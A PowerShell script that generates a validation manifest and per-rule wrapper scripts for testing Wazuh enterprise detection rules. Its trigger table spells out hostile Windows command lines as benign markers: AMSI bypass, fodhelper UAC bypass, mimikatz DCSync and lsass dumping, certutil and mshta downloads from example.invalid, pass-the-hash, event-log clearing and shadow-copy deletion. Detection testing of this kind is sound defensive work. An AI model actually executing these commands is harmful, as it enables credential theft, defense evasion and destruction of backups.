param(
    [string]$RulesPath = (Join-Path $PSScriptRoot '..\enterprise_rules.xml'),
    [string]$OutputRoot = $PSScriptRoot
)

$ErrorActionPreference = 'Stop'

if (-not (Test-Path -LiteralPath $RulesPath)) {
    throw "Rules file not found: $RulesPath"
}

$xml = [xml](Get-Content -LiteralPath $RulesPath -Raw)

$safeCommandLineTriggers = @{
    '100600' = 'winword.exe /macro WAZUH_VALIDATION_SAFE_MARKER'
    '100604' = 'mshta.exe https://example.invalid/payload.hta'
    '100615' = 'AmsiScanBuffer AmsiInitFailed amsiContext amsiUtils'
    '100616' = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('x','NonPublic')"
    '100617' = 'Set-Variable amsi placeholder'
    '100630' = 'wmic /NAMESPACE:\\root\subscription PATH __EventFilter Create ActiveScript CommandLine'
    '100631' = 'New-WMIEvent Set-WMIInstance Register-WMIEvent Filter Consumer Binding'
    '100632' = 'mofcomp C:\Temp\wazuh-validation.mof scrcons.exe'
    '100645' = 'fodhelper.exe reg add HKCU\Software\Classes\ms-settings\Shell\Open\command'
    '100646' = 'reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d calc.exe'
    '100647' = 'UACMe akagi bypassuac elevate token'
    '100660' = 'mimikatz lsadump::dcsync DRSGetNCChanges'
    '100676' = 'Rubeus.exe kerberoast GetUserSPNs'
    '100691' = 'Rubeus.exe asreproast GetNPUsers'
    '100705' = 'certipy adcs vuln certify pkiview getTGTpkinit'
    '100707' = 'certutil -urlcache -f http://example.invalid/payload.bin'
    '100720' = 'SharpHound invoke-bloodhound AzureHound ADCollector'
    '100721' = 'net group "domain admins" /domain'
    '100722' = 'ldifde csvde adfind dsquery nltest /domain_trusts'
    '100735' = 'sekurlsa::pth invoke-pth pass the hash crackmapexec -H 0123456789abcdef0123456789abcdef'
    '100736' = 'rubeus ptt kerberos::ptt invoke-ptt mimikatz ticket'
    '100750' = 'cobaltstrike cobalt strike beacon.exe cs.jar teamserver'
    '100751' = 'sliver havoc framework brute ratel nighthawk.exe deimos.exe'
    '100752' = 'meterpreter metasploit msf handler multi/handler'
    '100753' = 'rundll32.exe http://example.invalid/a.dll regsvr32.exe https://example.invalid/a.sct'
    '100766' = 'iodine dnscat dns2tcp dns tunnel dnstunnel'
    '100827' = 'git config url.foo.onion.insteadOf https://github.com'
    '100841' = 'robocopy C:\Temp \\192.0.2.10\share'
    '100857' = 'lazagne credentialfileview dumpCredStore vault dump keethief'
    '100858' = 'cmdkey /list vaultcmd /listcreds windows credential manager'
    '101016' = 'procdump -ma lsass.exe rundll32.exe comsvcs.dll MiniDump sekurlsa::logonpasswords'
    '100870' = 'wmic /node:HOST process call create cmd.exe psexec.exe \\HOST'
    '100871' = 'Enter-PSSession New-PSSession Invoke-Command -ComputerName HOST winrm invoke'
    '100873' = 'net use \\192.0.2.10\c$ /user:test placeholder'
    '101019' = 'schtasks /create /tn WazuhRuleValidation /sc once /tr cmd.exe'
    '101021' = 'wevtutil cl Security Clear-EventLog Remove-EventLog auditpol /clear'
    '101024' = 'vssadmin delete shadows /all /quiet wmic shadowcopy delete wbadmin delete catalog bcdedit /set recoveryenabled no cipher /w'
}

$scriptBlockTriggers = @{
    '101002' = 'AmsiUtils amsiInitFailed AmsiScanBuffer System.Management.Automation FromBase64String DownloadString IEX('
}

function Get-ElementText {
    param($Node, [string]$Name)
    $values = @()
    foreach ($child in $Node.ChildNodes) {
        if ($child.Name -eq $Name) {
            $values += [string]$child.InnerText
        }
    }
    return $values
}

function Get-RuleFields {
    param($Rule)
    $fields = @()
    foreach ($field in $Rule.field) {
        if ($null -ne $field) {
            $fields += [ordered]@{
                name = [string]$field.name
                type = [string]$field.type
                pattern = [string]$field.InnerText
            }
        }
    }
    return $fields
}

$rawRules = @()
foreach ($rule in $xml.group.rule) {
    $groups = @()
    if ($rule.group) {
        $groups = ([string]$rule.group).Split(',') | Where-Object { $_ }
    }

    $fields = @(Get-RuleFields -Rule $rule)
    $id = [string]$rule.id
    $method = 'server_alert_check'
    $trigger = $null
    $notes = 'Requires a real log source or server-side validation on the Wazuh manager.'

    if ($safeCommandLineTriggers.ContainsKey($id)) {
        $method = 'windows_sysmon_commandline'
        $trigger = $safeCommandLineTriggers[$id]
        $notes = 'Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.'
    }
    elseif ($scriptBlockTriggers.ContainsKey($id)) {
        $method = 'windows_powershell_scriptblock'
        $trigger = $scriptBlockTriggers[$id]
        $notes = 'Wymaga wlaczonego PowerShell Script Block Logging oraz zbierania Event ID 4104 przez agenta.'
    }
    elseif ($rule.if_matched_sid -or $rule.if_matched_group) {
        $method = 'correlation'
        $notes = 'Correlation rule; the runner triggers child rules from the same group when endpoint-safe triggers are available.'
    }

    $rawRules += [ordered]@{
        id = $id
        level = [int]$rule.level
        frequency = if ($rule.frequency) { [int]$rule.frequency } else { $null }
        timeframe = if ($rule.timeframe) { [int]$rule.timeframe } else { $null }
        description = [string]$rule.description
        if_sid = @(Get-ElementText -Node $rule -Name 'if_sid')
        if_group = @(Get-ElementText -Node $rule -Name 'if_group')
        if_matched_sid = @(Get-ElementText -Node $rule -Name 'if_matched_sid')
        if_matched_group = @(Get-ElementText -Node $rule -Name 'if_matched_group')
        groups = $groups
        fields = $fields
        endpoint_method = $method
        trigger_text = $trigger
        notes = $notes
        correlation_children = @()
    }
}

foreach ($entry in $rawRules) {
    if ($entry.endpoint_method -ne 'correlation') {
        continue
    }

    $children = @()
    foreach ($sid in $entry.if_matched_sid) {
        $children += $rawRules | Where-Object { $_['id'] -eq $sid -and $_['endpoint_method'] -ne 'server_alert_check' } | ForEach-Object { $_['id'] }
    }
    foreach ($group in $entry.if_matched_group) {
        $children += $rawRules | Where-Object {
            $_['id'] -ne $entry['id'] -and
            $_['groups'] -contains $group -and
            $_['endpoint_method'] -in @('windows_sysmon_commandline', 'windows_powershell_scriptblock')
        } | ForEach-Object { $_['id'] }
    }
    $entry.correlation_children = @($children | Sort-Object -Unique)
}

$manifest = [ordered]@{
    schema = 'wazuh-enterprise-rule-validation/v1'
    generated_at = (Get-Date).ToString('o')
    source_rules = (Resolve-Path -LiteralPath $RulesPath).Path
    safety_model = 'Endpoint scripts generate benign process/script-block telemetry with unique markers. Server-only entries must be checked against native integrations or Wazuh alerts.'
    rules = $rawRules
}

$manifestPath = Join-Path $OutputRoot 'enterprise_rule_tests.json'
$manifest | ConvertTo-Json -Depth 12 | Set-Content -LiteralPath $manifestPath -Encoding UTF8

$rulesDir = Join-Path $OutputRoot 'endpoint\rules'
New-Item -ItemType Directory -Force -Path $rulesDir | Out-Null

foreach ($entry in $rawRules) {
    $wrapperPath = Join-Path $rulesDir ("Invoke-Rule{0}.ps1" -f $entry.id)
    $wrapper = @"
param(
    [string]`$RunId,
    [string]`$OutDir = (Join-Path (Split-Path -Parent `$PSScriptRoot) 'output'),
    [switch]`$NoExecute,
    [int]`$DelaySeconds = 2
)

`$runner = Join-Path (Split-Path -Parent `$PSScriptRoot) 'Invoke-EnterpriseRuleTest.ps1'
`$params = @{
    RuleId = '$($entry.id)'
    OutDir = `$OutDir
    DelaySeconds = `$DelaySeconds
}
if (`$RunId) { `$params.RunId = `$RunId }
if (`$NoExecute) { `$params.NoExecute = `$true }
& `$runner @params
"@
    Set-Content -LiteralPath $wrapperPath -Value $wrapper -Encoding UTF8
}

Write-Host "Generated manifest: $manifestPath"
Write-Host "Generated per-rule wrappers: $rulesDir"
